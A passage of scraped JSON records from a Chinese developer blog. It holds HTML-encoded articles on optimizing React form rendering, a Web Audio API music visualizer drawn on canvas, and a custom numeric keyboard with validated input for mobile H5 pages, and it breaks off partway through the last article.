class=\"hljs-string\"\u003e\"members\"\u003c/span\u003e\n\u0009\u0009\u0009\u0009\u0009\u0009recipeName=\u003cspan class=\"hljs-string\"\u003e\"herbal\"\u003c/span\u003e\n\u0009\u0009\u0009\u0009\u0009\u0009component={FormMembers}\n\u0009\u0009\u0009\u0009\u0009\u0009change={change}\n\u0009\u0009\u0009\u0009\u0009\u0009public_expense={public_expense}\n\u0009\u0009\u0009\u0009\u0009/\u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;/table\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;/form\u0026gt;\n\u0009\u0009\u0009\u0026lt;/div\u0026gt;)\n\u0009}\n}\n\n//Members\nclass FormMembers extends Component{\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e {fields}=this.props;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e(\n\u0009\u0009\u0026lt;tbody\u0026gt;\n\u0009\u0009{fields.map((item,key)=\u0026gt;(\u0026lt;Line item={item} lineKey={key} /\u0026gt;))}\n\u0009\u0009\u0026lt;/tbody\u0026gt;)\n\u0009}\n}\n\n//每行刷新控制\nclass Line extends Component{\n\u0009constructor(props){\n\u0009\u0009super(props)\n\u0009\u0009this.currData={};\n\u0009}\n\u0009shouldComponentUpdate(nextProps,nextState){//改用手动控制每行渲染\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!isEqual(nextProps.fields.get(nextProps.lineKey),this.currData)){\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n\u0009\u0009}\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n\u0009}\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n\u0009\u0009this.currData=this.props.get(this.props.lineKey)\n\u0009\u0009console.log(\u003cspan class=\"hljs-string\"\u003e'//此处省略大量计算'\u003c/span\u003e)\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009\u0009\u0009\u0026lt;tr key={this.props.lineKey} \u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;td\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;Field name={`\u003cspan class=\"hljs-variable\"\u003e${item}\u003c/span\u003e.name`} component={Field}/\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;/td\u0026gt;\n\u0009\u0009\u0009\u0026lt;/tr\u0026gt;)\n\u0009}\n}\n\n//数字输入框\nclass Field extends Component{\n\u0009shouldComponentUpdate(nextProps, nextState){//改用手动控制渲染\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(nextProps.input.name==this.props.input.name \u0026amp;\u0026amp; \n\u0009\u0009\u0009nextProps.input.value==this.props.input.value \u0026amp;\u0026amp; \n\u0009\u0009\u0009nextProps.className==this.props.className  \u0026amp;\u0026amp;\n\u0009\u0009\u0009nextProps.id==this.props.id \u0026amp;\u0026amp;\n\u0009\u0009\u0009isEqual(nextProps.meta,this.props.meta)){\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u0009\u0009}\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\u0009}\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e {input}=this.props;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;input {...input} /\u0026gt;\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 class=\"heading\"\u003e建议使用 reselect 优化性能\u003c/h1\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/reactjs/reselect\"\u003ehttps://github.com/reactjs/reselect\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514894253.2046","__v":0}
{"_id":{"$oid":"5a4b76d92239bd131cd79f3a"},"id":"5a44d20af265da430945778d","author":{"$oid":"5a4b76d92239bd131cd79f28"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"有节奏的音乐跳动","meta":{"likeCount":0},"tag":["Canvas","前端","ECMAScript 6"],"comment":[],"shortContent":"最近在做一些新技术的调研，不巧在掘金上看到有人分享系列关于h5技术的运用，主要包括一些音频，媒体流，用户位置，环境光等H5核心设备接口的运用，所以自己准备照着那个目录动手做一番。这篇就是关于音频对象AudioContext做的小小DEMO，当然看了下别人的DEMO了，希望各位读…","content":"\u003ch3 class=\"heading\"\u003e写在最前：\u003c/h3\u003e\n\u003cp\u003e 最近在做一些新技术的调研，不巧在掘金上看到有人分享系列关于h5技术的运用，主要包括一些音频，媒体流，用户位置，环境光等H5核心设备接口的运用，所以自己准备照着那个目录动手做一番。这篇就是关于音频对象AudioContext做的小小DEMO，当然看了下别人的DEMO了，希望各位读者喜欢~\u003c/p\u003e\n\u003cp\u003e 照例，贴下\u003ca target=\"_blank\" href=\"https://github.com/ry928330/blog\"\u003e我的博客\u003c/a\u003e地址，别忘了去点赞哈~\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e成果展示：\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"audio\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cd49cfd3d4f3?w=818\u0026amp;h=356\u0026amp;f=gif\u0026amp;s=1129767\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eGit地址：\u003c/h3\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"\"\u003ehttps://github.com/ry928330/web-audio.git\u003c/a\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e功能说明：\u003c/h3\u003e\n\u003cp\u003e1.根据你在页面载入的音乐，以可视化的方式展示音乐的律动；\n2.点击模式切换，以时域波形的方式展示当前音乐的节奏。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e实现细节：\u003c/h3\u003e\n\u003cp\u003e 整个DEMO其实比较简单，主要就是熟悉一些跟\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Audio_API\"\u003eWeb Audio\u003c/a\u003e相关的API，所以讲解的时候我会介绍下本次DEMO用到的一些API的使用方式。还有，本次DEMO的一个难点就是你看到的条形图上顶部小方块儿的下落特效，这个我也会做下解释。页面中所看到的动画都是基于canvas绘制，这个我就不多说了。接下来，进入主题。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e创建基于audio的语音环境，代码如下：\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ewindow.AudioContext = window.AudioContext || window.webkitAudioContext || window.mozAudioContext;\nvar audioContext = new AudioContext(); \nvar analyser = audioContext.createAnalyser(); \nanalyser.fftSize = 2048;\nvar audio = document.getElementById(\u003cspan class=\"hljs-string\"\u003e'audio'\u003c/span\u003e);\nvar audioSrc = audioContext.createMediaElementSource(audio); \naudioSrc.connect(analyser);\nanalyser.connect(audioContext.destination);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 代码就这么几行，挨个进行解释。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e1.window.AudioContext = window.AudioContext || window.webkitAudioContext || window.mozAudioContext;\n2.var audioContext = new AudioContext(); \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 创建语音环境上下文，以后关于语音的一切操作都是在这个环境下进行。其实就跟canvas的getContext操作一个意思。为了兼容不同的浏览器，加了不同的前缀。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e3.var analyser = audioContext.createAnalyser();\n4.analyser.fftSize = 2048;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 创建一个Analyser节点，可以通过该节点获取音频信号的事件和频率数据。然后通过语句4可以设置频域FFT（快速傅里叶变换）取样点的多少。它的取值fftSize 属性的值必须是从32到32768范围内的2的非零幂，默认值是2048。但是，我们用不到这么多的点，所以后来只是选取了部分点的值用于展示音乐节奏。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e5.var audioSrc = audioContext.createMediaElementSource(audio);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 创建一个MediaElementAudioSourceNode接口来关联HTMLMediaElement. 这可以用来播放和处理来自video或audio 元素的音频。而且，我们还可以通过createMediaStreamSource()接口来获取计算机麦克风或者其他来源的音频流MediaStream信息。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e6.audioSrc.connect(analyser);\n7.analyser.connect(audioContext.destination);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 将analyser节点关联到目标音频环境上来，这里audioContext.destination返回AudioDestinationNode对象，AudioDestinationNode接口表示音频图形在特定情况下的最终输出地址,通常为扬声器。意思就是和音频设备关联。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e获取音频数据，渲染可视化律动界面：\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e 环境创建结束之后，我们就该取相关音频数据，基于canvas渲染可视化律动界面了。代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar array = new Uint8Array(analyser.frequencyB\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003eCount); \nanalyser.getByteFrequencyData(array);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e analyser.frequencyBinCount该值获取fftSize值的一半，通常情况下是等于将要用于可视化的数据数值的数量。然后，通过analyser.getByteFrequencyData(array)函数，将当前频域数据拷贝进Uint8Array数组中。然后，就是本次的难点，如何渲染顶部降落方块儿。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar barWidth = 10;\nvar gap = 2;\nvar barNum = Math.round(cWidth / (barWidth + gap));  //绘制多少个条形\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (var i = 0; i \u0026lt; barNum; i++) {\n    var value = array[i];\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (topArr.length \u0026lt; barNum) {\n        topArr.push(value)\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (value \u0026lt; topArr[i]) {\n        ctx.fillRect(i * (barWidth + gap), cHeight - (topArr[i] -= 1) - topHeight, barWidth, topHeight);\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        ctx.fillRect(i * (barWidth + gap), cHeight - value - topHeight, barWidth, topHeight);\n        topArr[i] = value;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 根据canvas的宽度以及条形的宽度和间距我们计算了将要绘制的条形数量，然后该数量值也就决定了我们用来选取的音频数据的多少。对于顶部小方块儿，我们创建了一个数组，数组初始化值为音频数据，如果新的音频数据比之前对应的初始化的数据值要大，我们就直接绘制出顶部的小方块儿，然后根据新的音频数据更新初始化的数据值。反之，如果新来的音频数据比初始化的数据要小，这时候，通过初始值的逐渐减一效果，达到小方块儿不断降落的特效。最后，对于条形的渲染如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar grd = ctx.createLinearGradient(i * barWidth, cHeight - value, i * barWidth, cHeight);\ngrd.addColorStop(0, \u003cspan class=\"hljs-string\"\u003e\"yellow\"\u003c/span\u003e);\ngrd.addColorStop(0.3, \u003cspan class=\"hljs-string\"\u003e\"rgb(255,0,0)\"\u003c/span\u003e);\ngrd.addColorStop(0.5, \u003cspan class=\"hljs-string\"\u003e\"rgb(200,0,0)\"\u003c/span\u003e);\ngrd.addColorStop(0.7, \u003cspan class=\"hljs-string\"\u003e\"rgb(150,20,20)\"\u003c/span\u003e);\ngrd.addColorStop(1, \u003cspan class=\"hljs-string\"\u003e\"rgb(100,0,0)\"\u003c/span\u003e);\nctx.fillStyle = grd;\nctx.fillRect(i * (barWidth + gap), cHeight - value, barWidth, topArr[i]);\nctx.fill();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e 这里，我们给条形的颜色加了一个线性的渐变，让其看上去稍微那么好看些哈~（好像并没有好看多少...）\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e波形模式的切换：\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e 有了前面音频数据的条形渲染，这个就显得更简单了，就是数据源取值的不同而已，通过以下代码将时域数据拷贝进array数组里面，剩下的绘制就是通过canvas的moveTo以及lineTo的API了，我就不做详细的介绍了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eanalyser.getByteTimeDomainData(array);\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e参考资料：\u003c/h3\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"\"\u003e1.http://www.codes51.com/itwd/4327802.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e2.\u003ca target=\"_blank\" href=\"http://www.zhangxinxu.com/wordpress/2017/06/html5-web-audio-api-js-ux-voice/\"\u003e张鑫旭的利用HTML5Web Audio API给网页JS交互增加声音\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e3.\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Audio_API\"\u003eMDN Web Audio 接口\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514893561.7878","__v":0}
{"_id":{"$oid":"5a4b76a1b11e1a170cb138ea"},"id":"5a44c5eef265da432d2868f6","author":{"$oid":"5a4b76a1b11e1a170cb138d5"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/28/1609cc26a47774c1?w=1080\u0026h=1920\u0026f=jpeg\u0026s=97883","https://user-gold-cdn.xitu.io/2017/12/28/1609ca5f7a8f5767?w=230\u0026h=212\u0026f=jpeg\u0026s=6253","https://user-gold-cdn.xitu.io/2017/12/28/1609ca9e85a369e9?w=459\u0026h=195\u0026f=gif\u0026s=59649","https://user-gold-cdn.xitu.io/2017/12/28/1609cc4217c080c6?w=204\u0026h=233\u0026f=jpeg\u0026s=5135","https://user-gold-cdn.xitu.io/2017/12/28/1609cc75e7d8709c?w=261\u0026h=51\u0026f=jpeg\u0026s=1496","https://user-gold-cdn.xitu.io/2017/12/28/1609cfd5895f4abe?w=291\u0026h=522\u0026f=jpeg\u0026s=8679","https://user-gold-cdn.xitu.io/2017/12/28/1609cb490ca50f8d?w=511\u0026h=389\u0026f=gif\u0026s=502766","https://user-gold-cdn.xitu.io/2017/12/28/1609cbd97c7d670f?w=597\u0026h=425\u0026f=jpeg\u0026s=19264"],"screenShot":null}],"title":"一个数字键盘引发的血案——移动端H5输入框、光标、数字键盘全假套件实现","meta":{"likeCount":0},"tag":["JavaScript","Vue.js","前端","jQuery"],"comment":[],"shortContent":"进入某页面自动弹出带小数点的数字键盘，并且自带输入验证，比如金额——只能输入数字和小数点，并且只能输入一位小数点、小数位不超过2位，且输入前验证不合法就不让输入、(UE特加功能——定制光标颜色\u003e.\u003c简直是反人类的需求)。细分如下： 1. 基于input + 手机自带键盘实现方案…","content":"\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cc26a47774c1?w=1080\u0026amp;h=1920\u0026amp;f=jpeg\u0026amp;s=97883\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e为啥要写假键盘？\u003c/p\u003e\n\u003cp\u003e还是输入框、光标全假的假键盘？\u003c/p\u003e\n\u003cp\u003e手机自带的不用非得写个假的，吃饱没事干吧？\u003c/p\u003e\n\u003cp\u003e装逼？炫技？\u003c/p\u003e\n\u003cp\u003e宝宝也是被逼的，宝宝也很委屈~.~\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609ca5f7a8f5767?w=230\u0026amp;h=212\u0026amp;f=jpeg\u0026amp;s=6253\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e问题产生背景\u003c/h2\u003e\n\u003cp\u003e移动端H5项目需求点：\u003c/p\u003e\n\u003cp\u003e进入某页面自动弹出带小数点的数字键盘，并且自带输入验证，比如金额——只能输入数字和小数点，并且只能输入一位小数点、小数位不超过2位，且输入前验证不合法就不让输入、(UE特加功能——定制光标颜色\u0026gt;.\u0026lt;简直是反人类的需求)。细分如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e进入相关页面，输入框自动获取焦点\u003c/li\u003e\n\u003cli\u003e键盘自动弹出\u003c/li\u003e\n\u003cli\u003e弹出带小数点的数字键盘\u003c/li\u003e\n\u003cli\u003e数字输入前自动验证，只能输入一个小数点，小数位数不超过2位，超过就不能继续输入\u003c/li\u003e\n\u003cli\u003e如果光标在第一位，此时键入的是'.'，则自动放入'0'再插入'.'\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e实现方案拟定\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e1. 基于input + 手机自带键盘实现方案\u003c/h3\u003e\n\u003cp\u003e（1）针对功能点1，可以给 input 设置属性 autofocus , 输入框就能自动聚焦。 轻松搞定\u003c/p\u003e\n\u003cp\u003e（2）针对功能点2 ，给input设置属性 autofocus 会自动聚焦但是键盘并不会自动弹出;\u003c/p\u003e\n\u003cp\u003e必须手动点击输入框键盘才会弹出; 于是在进入页面的时候用js触发click或者foucus，发现键盘也不会自动弹出，延时click、focus也没能弹出;那么只有最后一种方案——就是让NA端提供让键盘弹出的方法。 \u003cstrong\u003e纯前端无法搞定，需要NA端协助/，或者找PM砍掉自动弹键盘的需求\u0026gt;.\u0026lt;（勉强能够接受）\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e（3）针对功能点3，弹数字键盘的方法可以设置 type = \"number\" 或者type = \"tel\"; 前者在Andriod可以弹出数字键盘在ios端只能弹全键盘，后者在Android和ios弹出的都是数字键盘，但是！！坑爹的，弹出的数字键盘没有小数点！（我的华为荣耀9倒是很给力的给我弹了个带小数点的数字键盘，不容易啊啊） \u003cstrong\u003e只能选择type = \"number\",勉强能接受ios弹全键盘吧\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e（4）针对功能点4， 设置type = \"number\"，发现可以不停的输入小数点啊啊啊啊看着真的要疯了，第一次输入小数点也不能自动变成'0.'\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609ca9e85a369e9?w=459\u0026amp;h=195\u0026amp;f=gif\u0026amp;s=59649\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n图1 原生input type=number 效果\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这时候聪明的你一定想到要使用事件监听键入的字符，在输入之前进行判断，然后决定是否放入输入框。\u003c/p\u003e\n\u003cp\u003e你肯定又会开心的想到一堆可能有用的事件：onkeydown，onkeyup，onchange，oninput，onpropertychange，textInput。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cc4217c080c6?w=204\u0026amp;h=233\u0026amp;f=jpeg\u0026amp;s=5135\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e路漫漫其修远兮啊~经过不断尝试之后仍然发现很多问题。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eonkeyup——虽然每增加删除字符都会触发，但增加字符的时候是值输入之后才触发，无法做到输入前验证;\u003c/li\u003e\n\u003cli\u003eonchange——是在内容改变（两次内容有可能相等）且失去焦点时触发，也无法做到输入前验证。\u003c/li\u003e\n\u003cli\u003eonpropertychange——onchange事件在内容改变（两次内容有可能还是相等的）且失去焦点时触发；即每增加或删除一个字符就会触发，通过js改变也会触发该事件，但是该事件IE专有。\u003c/li\u003e\n\u003cli\u003eoninput——移动端很多手机不支持。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e（只剩下onkeyup/textInput，还有一线希望刚芭蕾\u0026gt;.\u0026lt;。）\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eonkeyup——其事件有两个相关属性event.key和event.keyCode。event.key在我的华为荣耀9手机上都不生效（其他低版本手机可想而知）。但其还有一个属性event.keyCode其在PC端的值是键入字符的ascii码。但在手机端输入任何数字或者小数点其值均为229（华为荣耀9测试），所以onkeyup也不能用。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eontextInput——在pc和移动端都支持！！！（功夫不负有心人）其event.data可以获取到输入的值。欢天喜地，举国欢庆，啊哈哈~~\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e终于松了一口气，只要能在输入前获取值就能验证了呀。\u003c/p\u003e\n\u003cp\u003e自信满满的一口气写完验证过程：\u003c/p\u003e\n\u003cp\u003ehtml\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;input\n    id=\u003cspan class=\"hljs-string\"\u003e\"amount-input\"\u003c/span\u003e\n    autofocus\n    \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"number\"\u003c/span\u003e\n    @textInput=\u003cspan class=\"hljs-string\"\u003e\"checkNumber\"\u003c/span\u003e\n    v-model=\u003cspan class=\"hljs-string\"\u003e\"amount\"\u003c/span\u003e\n    require/\u0026gt; \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ejs\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003echeckNumber(event) {\n  var key = event.data || \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (key.search(/[0-9\\.]/) \u0026gt; -1) {\n     var value = document.getElementById(\u003cspan class=\"hljs-string\"\u003e'amount-input'\u003c/span\u003e).value;\n     \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (key === \u003cspan class=\"hljs-string\"\u003e'.'\u003c/span\u003e \u0026amp;\u0026amp; value.search(/\\./) \u0026gt; -1) {\n        event.preventDefault();\n     }\n     \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (value.search(/\\.\\d{2}/) \u0026gt; -1) {\n       event.preventDefault();\n     }\n  } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n     event.preventDefault();\n  }\n},\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e杯具再次发生了~~~~~我所期望的效果仍然没有达到。\u003c/p\u003e\n\u003cp\u003e通过value获取输入框内所有字符失败\u003c/p\u003e\n\u003cp\u003e发现\u003ccode\u003einput type = number\u003c/code\u003e 取到的value只能是数值，无法获取输入框里的所有字符。\u003c/p\u003e\n\u003cp\u003e也就是说如果输入'12.'，通过value获取到是'12'，只输入'.'，value获取到的是' '空字符串，获取不到小数点。这样就无法判断是否输入小数点，因而不能判断是否还能输入小数点，那就还是能输入无数个小数点，问题依然得不到解决。\u003c/p\u003e\n\u003cp\u003e尝试：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e使用VUE中双向绑定的this.amount来获取输入的所有字符，发现this.amount获取到的和value获取值的情况相同。尝试失败。\u003c/li\u003e\n\u003cli\u003e通过textInput获取到的输入值，自己维护一个字符数组。但是textInput在删除时不会触发，因而不能实时获取input输入框里面的所有准确字符；而且由于无法获取光标在input输入框的具体位置而无法确定删除的是哪个字符，因而字符数组无法准确维护。尝试失败。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e（5）针对功能点5，功能4解决了，功能5是小case。。。\u003c/p\u003e\n\u003cp\u003e所以基于input + 手机自带键盘实现方案要满足以上需求难以实现\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2. 基于input + 假数字键盘实现方案\u003c/h3\u003e\n\u003cp\u003e若是用假键盘加原生input输入框，需要做到：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e禁用手机自带键盘\u003c/li\u003e\n\u003cli\u003e获取Input输入框中的内容\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e禁用手机自带键盘，在没有NA暴露的方法支持的情况下，可以设置Input的readonly属性。这样的话输入框也不能添加删除字符了。若在可以要NA端提供禁用手机自带键盘的方法的前提下，要实现点击假键盘输入框能添加删除字符。\u003c/p\u003e\n\u003cp\u003e若是只从后面添加删除，很容易实现，只需要将点击键盘对应的字符拼接到\u003ccode\u003eInput type=text\u003c/code\u003e获取到的value的后面，删除同理。但是要是光标不在最后一位，而是在中间\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cc75e7d8709c?w=261\u0026amp;h=51\u0026amp;f=jpeg\u0026amp;s=1496\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e 图2 光标在数字中间示例图\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么当我们点击假键盘添加或删除字符的时候，如何能知道添加或删除字符的位置呢。也许需要获取光标位置。目前只有IE和火狐支持的document.selection，selectionStart可以获取光标位置。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// 获取光标位置\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e getCursortPosition (textDom) {\n var cursorPos = 0;\n \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (document.selection) {\n  // IE Support\n  textDom.focus ();\n  var selectRange = document.selection.createRange();\n  selectRange.moveStart (\u003cspan class=\"hljs-string\"\u003e'character'\u003c/span\u003e, -textDom.value.length);\n  cursorPos = selectRange.text.length;\n }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (textDom.selectionStart || textDom.selectionStart == \u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e) {\n  // Firefox support\n  cursorPos = textDom.selectionStart;\n }\n \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e cursorPos;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由于我们的是移动端H5开发项目，考虑兼容性，显然以上方法不能兼容大部分的机型。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3. 输入框、光标、数字键盘全假实现方案\u003c/h3\u003e\n\u003cp\u003e以上两种方案均难以实现，因此我只能大胆想象，要实现满足以上需求的假键盘就得实现假输入框、假光标、假keyboard的一套装备。这样所有的元素我都能控制，上面的那些问题全部可以解决。\u003c/p\u003e\n\u003cp\u003e雏形若是实现只能从最后面增加删除没有光标的假键盘非常容易，只需要给每个键绑定一个click事件，维护一个数组，每次从后面push或者pop就能维护输入框中的内容。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cfd5895f4abe?w=291\u0026amp;h=522\u0026amp;f=jpeg\u0026amp;s=8679\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e 图3 只能从最后添加、删除且没有光标的效果图\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是这样跟正真的输入框效果比体验太差了。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e难点\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e要实现体验跟原生键盘一样并且自带输入验证的假键盘，难点主要在于：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e有光标，且光标闪动\u003c/li\u003e\n\u003cli\u003e光标定位，点击数字中间光标自动移过去\u003c/li\u003e\n\u003cli\u003e根据光标的位置实现插入删除\u003c/li\u003e\n\u003cli\u003e失去焦点光标隐藏，点击输入框光标显示并且弹出键盘\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e原生js实现\u003c/h2\u003e\n\u003cp\u003e对于光标实现，创造一个元素设置背景色，可以控制它隐藏和出现。\u003c/p\u003e\n\u003cp\u003e对于“点击数字中间光标自动移过去 